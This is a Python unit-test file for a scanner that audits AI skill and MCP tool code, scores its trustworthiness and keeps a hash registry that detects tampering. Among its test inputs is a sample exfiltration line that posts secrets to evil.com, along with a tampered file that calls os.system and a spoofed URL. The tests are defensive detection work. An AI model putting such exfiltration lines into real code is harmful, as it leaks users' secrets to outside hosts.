#!/usr/bin/env python3
"""Unit tests for skill/MCP security audit system."""
import os
import sys
import tempfile
import unittest
from pathlib import Path

_SCRIPTS = Path(__file__).parent.parent
if str(_SCRIPTS) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS))


class TestFinding(unittest.TestCase):
    def test_finding_fields(self):
        from security.scanner import Finding
        f = Finding(
            category="obfuscation",
            severity="CRITICAL",
            line_no=42,
            snippet="eval(user_input)",
            context="line 41\neval(user_input)\nline 43",
        )
        self.assertEqual(f.category, "obfuscation")
        self.assertEqual(f.severity, "CRITICAL")
        self.assertEqual(f.line_no, 42)
        self.assertEqual(f.snippet, "eval(user_input)")
        self.assertEqual(f.context, "line 41\neval(user_input)\nline 43")


class TestScanner(unittest.TestCase):
    def _scan(self, code: str) -> list:
        from security.scanner import scan
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(code)
            fname = f.name
        try:
            return scan(fname)
        finally:
            os.unlink(fname)

    def test_detects_eval(self):
        findings = self._scan("result = eval(user_input)\n")
        cats = [f.category for f in findings]
        sevs = [f.severity for f in findings]
        self.assertIn("obfuscation", cats)
        self.assertIn("CRITICAL", sevs)

    def test_detects_shell_true(self):
        findings = self._scan("subprocess.run(cmd, shell=True)\n")
        cats = [f.category for f in findings]
        self.assertIn("shell_injection", cats)
        highs = [f for f in findings if f.severity == "HIGH"]
        self.assertTrue(len(highs) >= 1)

    def test_detects_exfiltration(self):
        findings = self._scan('requests.post("http://evil.com/steal", data=secrets)\n')
        cats = [f.category for f in findings]
        self.assertIn("exfiltration", cats)
        crits = [f for f in findings if f.severity == "CRITICAL"]
        self.assertTrue(len(crits) >= 1)

    def test_clean_file_no_findings(self):
        findings = self._scan(
            "def greet(name: str) -> str:\n"
            "    return f'Hello, {name}'\n"
        )
        self.assertEqual(findings, [])

    def test_detects_network_import(self):
        findings = self._scan("import requests\ndata = requests.get(url)\n")
        cats = [f.category for f in findings]
        self.assertIn("network", cats)

    def test_detects_exec(self):
        findings = self._scan("exec(compile(src, '<str>', 'exec'))\n")
        crits = [f for f in findings if f.severity == "CRITICAL"]
        self.assertTrue(len(crits) >= 1)

    def test_snippet_capped_at_120(self):
        long_eval = 'eval("' + "a" * 200 + '")\n'  # 208+ chars, triggers obfuscation
        findings = self._scan(long_eval)
        self.assertTrue(len(findings) >= 1, "Expected at least one finding on long eval line")
        for f in findings:
            self.assertLessEqual(len(f.snippet), 120)


class TestScanSkillMdCapabilities(unittest.TestCase):
    def _write_skill_md(self, content: str) -> str:
        f = tempfile.NamedTemporaryFile(mode="w", suffix=".md", delete=False)
        f.write(content)
        f.close()
        return f.name

    def test_parses_capabilities_block(self):
        from security.scanner import scan_skill_md_capabilities
        path = self._write_skill_md(
            "# capabilities:\n"
            "#   network: false\n"
            "#   filesystem_write: false\n"
        )
        try:
            caps = scan_skill_md_capabilities(path)
            self.assertIsNotNone(caps)
            self.assertFalse(caps["network"])
            self.assertFalse(caps["filesystem_write"])
        finally:
            os.unlink(path)

    def test_missing_file_returns_none(self):
        from security.scanner import scan_skill_md_capabilities
        caps = scan_skill_md_capabilities("/nonexistent/SKILL.md")
        self.assertIsNone(caps)

    def test_no_capabilities_block_returns_none(self):
        from security.scanner import scan_skill_md_capabilities
        path = self._write_skill_md("# This skill does X\nNo capabilities block here.\n")
        try:
            caps = scan_skill_md_capabilities(path)
            self.assertIsNone(caps)
        finally:
            os.unlink(path)


class TestScorer(unittest.TestCase):
    def _make_finding(self, severity: str, category: str = "obfuscation"):
        from security.scanner import Finding
        return Finding(category=category, severity=severity,
                       line_no=1, snippet="x", context="x")

    def test_no_findings_is_100(self):
        from security.scorer import score
        result = score([], skill_md_caps=None, source_url=None)
        self.assertEqual(result["score"], 100)
        self.assertEqual(result["category"], "TRUSTED")

    def test_critical_deducts_35(self):
        from security.scorer import score
        findings = [self._make_finding("CRITICAL")]
        result = score(findings, skill_md_caps=None, source_url=None)
        self.assertEqual(result["score"], 65)
        self.assertEqual(result["category"], "REVIEW")

    def test_two_criticals_blocked(self):
        from security.scorer import score
        findings = [self._make_finding("CRITICAL"), self._make_finding("CRITICAL")]
        result = score(findings, skill_md_caps=None, source_url=None)
        self.assertEqual(result["score"], 30)  # 100 - 35 - 35 = 30
        self.assertEqual(result["category"], "BLOCKED")

    def test_trust_bonus_source_url(self):
        from security.scorer import score
        result = score(
            [],
            skill_md_caps=None,
            source_url="https://github.com/anthropics/some-skill",
        )
        self.assertEqual(result["score"], 100)  # 100 + 10 = 110, capped at 100

    def test_trust_bonus_no_path_spoofing(self):
        from security.scorer import score
        # A URL containing "anthropics" in the path but NOT matching the prefix
        # must NOT earn a bonus — only exact prefix match counts
        result = score(
            [],
            skill_md_caps=None,
            source_url="https://evil.com/anthropics/some-skill",
        )
        self.assertEqual(result["score"], 100)
        self.assertEqual(result["breakdown"]["bonus"], 0)

    def test_skill_md_mismatch_penalty(self):
        from security.scorer import score
        from security.scanner import Finding
        findings = [Finding("network", "HIGH", 1, "import requests", "")]
        caps = {"network": False}
        result = score(findings, skill_md_caps=caps, source_url=None)
        # 100 - 15 (HIGH) - 20 (mismatch) = 65
        self.assertEqual(result["score"], 65)
        self.assertTrue(result["mismatch"])

    def test_floor_is_zero(self):
        from security.scorer import score
        findings = [self._make_finding("CRITICAL")] * 10
        result = score(findings, skill_md_caps=None, source_url=None)
        self.assertEqual(result["score"], 0)
        self.assertEqual(result["category"], "BLOCKED")


class TestRegistry(unittest.TestCase):
    def setUp(self):
        """Use an in-memory SQLite DB for isolation."""
        import security.registry as reg
        self._orig_db = reg._DB_PATH
        reg._DB_PATH = ":memory:"
        reg._CONN = None
        reg._init_db()

    def tearDown(self):
        import security.registry as reg
        reg._DB_PATH = self._orig_db
        if reg._CONN:
            reg._CONN.close()
        reg._CONN = None

    def _make_temp_skill(self, content: str = "def hello(): pass\n") -> str:
        f = tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False)
        f.write(content)
        f.close()
        return f.name

    def test_hash_roundtrip(self):
        import security.registry as reg
        path = self._make_temp_skill("def safe(): pass\n")
        try:
            h1 = reg.compute_hash(path)
            h2 = reg.compute_hash(path)
            self.assertEqual(h1, h2)
            self.assertEqual(len(h1), 64)  # SHA256 hex
        finally:
            os.unlink(path)

    def test_hash_changes_on_modification(self):
        import security.registry as reg
        path = self._make_temp_skill("def original(): pass\n")
        try:
            h1 = reg.compute_hash(path)
            Path(path).write_text("def modified(): pass\n")
            h2 = reg.compute_hash(path)
            self.assertNotEqual(h1, h2)
        finally:
            os.unlink(path)

    def test_register_and_get(self):
        import security.registry as reg
        path = self._make_temp_skill()
        try:
            reg.register("my-skill", path, score=85, category="TRUSTED",
                         findings=[], source_url=None)
            row = reg.get("my-skill")
            self.assertIsNotNone(row)
            self.assertEqual(row["skill_name"], "my-skill")
            self.assertEqual(row["trust_score"], 85)
            self.assertEqual(row["category"], "TRUSTED")
        finally:
            os.unlink(path)

    def test_register_upserts(self):
        import security.registry as reg
        path = self._make_temp_skill()
        try:
            reg.register("my-skill", path, score=70, category="REVIEW",
                         findings=[], source_url=None)
            reg.register("my-skill", path, score=90, category="TRUSTED",
                         findings=[], source_url=None)
            row = reg.get("my-skill")
            self.assertEqual(row["trust_score"], 90)
        finally:
            os.unlink(path)

    def test_set_approved(self):
        import security.registry as reg
        path = self._make_temp_skill()
        try:
            reg.register("my-skill", path, score=70, category="REVIEW",
                         findings=[], source_url=None)
            reg.set_approved("my-skill", "jordan")
            row = reg.get("my-skill")
            self.assertEqual(row["approved_by"], "jordan")
        finally:
            os.unlink(path)

    def test_verify_all_detects_change(self):
        import security.registry as reg
        path = self._make_temp_skill("def original(): pass\n")
        try:
            reg.register("my-skill", path, score=85, category="TRUSTED",
                         findings=[], source_url=None)
            # Modify the file after registration
            Path(path).write_text("def tampered(): import os; os.system('evil')\n")
            results = reg.verify_all()
            changed = [r for r in results if r[1] == "changed"]
            self.assertEqual(len(changed), 1)
            self.assertEqual(changed[0][0], "my-skill")
        finally:
            os.unlink(path)

    def test_verify_all_ok_unchanged(self):
        import security.registry as reg
        path = self._make_temp_skill()
        try:
            reg.register("my-skill", path, score=85, category="TRUSTED",
                         findings=[], source_url=None)
            results = reg.verify_all()
            ok = [r for r in results if r[1] == "ok"]
            self.assertEqual(len(ok), 1)
        finally:
            os.unlink(path)

    def test_verify_all_handles_deleted_file(self):
        import security.registry as reg
        path = self._make_temp_skill("def deleteme(): pass\n")
        reg.register("deleteme-skill", path, score=85, category="TRUSTED",
                     findings=[], source_url=None)
        # Delete the file before verify
        os.unlink(path)
        results = reg.verify_all()
        missing = [r for r in results if r[1] == "missing"]
        self.assertEqual(len(missing), 1)
        self.assertEqual(missing[0][0], "deleteme-skill")

    def test_set_approved_raises_on_missing_skill(self):
        import security.registry as reg
        with self.assertRaises(KeyError):
            reg.set_approved("nonexistent-skill", "jordan")


if __name__ == "__main__":
    unittest.main()
